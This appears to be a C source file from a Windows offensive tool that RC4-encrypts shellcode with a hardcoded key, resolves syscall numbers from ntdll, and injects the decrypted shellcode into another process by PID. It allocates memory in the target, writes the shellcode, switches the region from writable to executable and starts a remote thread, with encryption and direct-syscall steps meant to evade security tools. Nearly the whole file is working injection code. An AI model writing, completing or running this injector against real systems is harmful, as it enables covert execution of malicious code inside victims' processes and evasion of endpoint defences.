#include "Box.h"


/*--------------------------------------------------------[RC4 Encryption]----------------------------------------------------*/


BOOL EncryptRC4(
	_In_ CONST PBYTE pShellcode,
	_In_ CONST SIZE_T sSizeofShellcode
)
{

	NTSTATUS STATUS = NULL;

	BYTE _key[] = { 0xDE,0xAD,0xBE,0xEF }; // key used to decrypt and encrypt shellcode

	// ensure everything is working
	if (!pShellcode || sSizeofShellcode == 0) {
		WARN("EncryptRC4_SystemFunc: invalid params");
		return FALSE;
	}

	DATA_BLOB data_blob = { .cbData = (DWORD)sSizeofShellcode, .pbData = pShellcode };
	DATA_BLOB key_blob = { .cbData = (DWORD)sizeof(_key), .pbData = _key };

	// SystemFunction033 from advapi32
	_SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary(L"advapi32"), "SystemFunction033");
	if (!SystemFunction033) {
		WARN("GetProcAddress(SystemFunction033) failed");
		return FALSE;
	}

	if ((STATUS = SystemFunction033(&data_blob, &key_blob)) != 0x0)
	{
		printf("[!] SystemFunction033 FAILED With Error : 0x%0.8X\n", STATUS);
		return FALSE;
	}


	for (DWORD i = 0; i < data_blob.cbData; i++)
	{
		if (i % 16 == 0) printf("\n ");
		Sleep(1);
		printf(" %02x", data_blob.pbData[i]);
	}



	printf("\nCurrent RC4 Encrypted Shellcode Address: %p\n", (void*)data_blob.pbData);

	return TRUE;
}


/*-------------------------------------------------------[GetProcAddress ALternative]---------------------------------------------------*/


VOID GetSSN(IN HMODULE mod, IN LPCSTR FuncName, OUT DWORD* FuncSSN)
{

	UINT_PTR NtFunctionAddress = 0;

	NtFunctionAddress = (UINT_PTR)GetProcAddress(mod, FuncName);
	if (NtFunctionAddress == 0)
	{
		WARN("GetProcAddress Failed! With an Error: %ld", GetLastError());
		return;
	}

	BYTE byte4 = ((PBYTE)NtFunctionAddress)[4];
	BYTE byte5 = ((PBYTE)NtFunctionAddress)[5];
	*FuncSSN = (byte5 << 8) | byte4;

	return;
}


/*-----------------------------------------------------[Direct Syscalls]------------------------------------------------------*/


BOOL NtShellInjection(
	_In_ CONST DWORD PID,
	CONST PBYTE pEncryptedShellcode,
	_In_ CONST PBYTE pShellcode,
	_In_ CONST SIZE_T sSizeofShellcode
)

{


	NTSTATUS		STATUS = NULL;
	HANDLE		  hProcess = NULL;
	HANDLE		   hThread = NULL;
	PVOID		   rBuffer = NULL;
	DWORD			   TID = NULL;
	BOOL             State = TRUE;
	HMODULE    NtdllHandle = NULL;
	DWORD       OldProtection = 0;
	SIZE_T       BytesWritten = 0;
	SIZE_T origSize = sSizeofShellcode;
	SIZE_T regionSize = sSizeofShellcode;
	CLIENT_ID CID = { (HANDLE)PID, NULL };
	OBJECT_ATTRIBUTES OA = { 0 }; OA.Length = sizeof(OBJECT_ATTRIBUTES);


	NtdllHandle = GetModuleHandleW(L"NTDLL");
	if (NULL == NtdllHandle) {
		WARN("GetModuleHandleW", GetLastError());
		return FALSE;
	}
	OKAY("[0x%p] got the address of NTDLL!", NtdllHandle);


	/*-------------------------------------[Externally calling all function from DirectSyscalls.asm]-------------------------------------------------------*/


	GetSSN(NtdllHandle, "NtOpenProcess", &g_NtOpenProcessSSN);
	GetSSN(NtdllHandle, "NtAllocateVirtualMemory", &g_NtAllocateVirtualMemorySSN);
	GetSSN(NtdllHandle, "NtWriteVirtualMemory", &g_NtWriteVirtualMemorySSN);
	GetSSN(NtdllHandle, "NtProtectVirtualMemory", &g_NtProtectVirtualMemorySSN);
	GetSSN(NtdllHandle, "NtCreateThreadEx", &g_NtCreateThreadExSSN);
	GetSSN(NtdllHandle, "NtWaitForSingleObject", &g_NtWaitForSingleObjectSSN);
	GetSSN(NtdllHandle, "NtFreeVirtualMemory", &g_NtFreeVirtualMemorySSN);
	GetSSN(NtdllHandle, "NtClose", &g_NtCloseSSN);
	_SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary(L"advapi32"), "SystemFunction033");



	STATUS = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtOpenProcess Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("[0x%p] Successfully Got a handle to the process: [%ld]", hProcess, PID);

	// allocate SizeofShellcode to VirtualMemory
	STATUS = NtAllocateVirtualMemory(hProcess, &rBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtAllocateVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("Allocated %zu Bytes to Virtual Memory!", sSizeofShellcode);


	/*---------------------------------------------------------------[Decrypting RC4 Shellcode]---------------------------------------------*/


	// Used to decrypt Shellcode
	PUCHAR localBuf = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, sSizeofShellcode);
	if (!localBuf) {
		WARN("HeapAlloc failed for localBuf");
		HeapFree(GetProcessHeap(), 0, localBuf);
		localBuf = NULL;
		State = FALSE;
	}
	RtlCopyMemory(localBuf, pEncryptedShellcode, sSizeofShellcode);


	DATA_BLOB data_local = { .cbData = (DWORD)sSizeofShellcode, .pbData = localBuf };


	BYTE local_key_bytes[] = { 0xDE, 0xAD, 0xBE, 0xEF };
	DATA_BLOB key_local = { .cbData = (DWORD)sizeof(local_key_bytes), .pbData = local_key_bytes };


	if ((STATUS = SystemFunction033(&data_local, &key_local)) != 0x0)
	{
		printf("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
		HeapFree(GetProcessHeap(), 0, localBuf);
		return FALSE;
	}

	OKAY("Successfully Decrypted RC4!");


	/*------------------------------------------------------------------------[Writing Shellcode to Virtual Memory]-----------------------------------------------------------*/


	// Write the newly decrypted shellcode inside
	STATUS = NtWriteVirtualMemory(hProcess, rBuffer, localBuf, origSize, &BytesWritten);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtWriteVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("Wrote %zu Bytes to the Virtual Memory!", BytesWritten);

	// change permissions
	STATUS = NtProtectVirtualMemory(hProcess, &rBuffer, &origSize, PAGE_EXECUTE_READ, &OldProtection);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtProtectVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("Changed Allocation Protection from [RW] to [RX]");

	STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, rBuffer, NULL, FALSE, 0, 0, 0, NULL);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtCreateThreadEx Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("[0x%p] Successfully Created a Thread!", hThread);
	INFO("Waiting for Thread to finish executing...");
	STATUS = NtWaitForSingleObject(hThread, FALSE, NULL);
	INFO("Execution Completed! Cleaning Up!");




CLEANUP:


	if (rBuffer) {
		STATUS = NtFreeVirtualMemory(hProcess, &rBuffer, &sSizeofShellcode, MEM_DECOMMIT);
		if (STATUS_SUCCESS != STATUS) {
			WARN("NtFreeVirtualMemory", STATUS);
		}
		else {
			INFO("[0x%p] decommitted allocated buffer from process memory", rBuffer);
		}
	}

	if (hThread) {
		NtClose(hThread);
		INFO("[0x%p] handle on thread closed", hThread);
	}

	if (hProcess) {
		NtClose(hProcess);
		INFO("[0x%p] handle on process closed", hProcess);


	}
}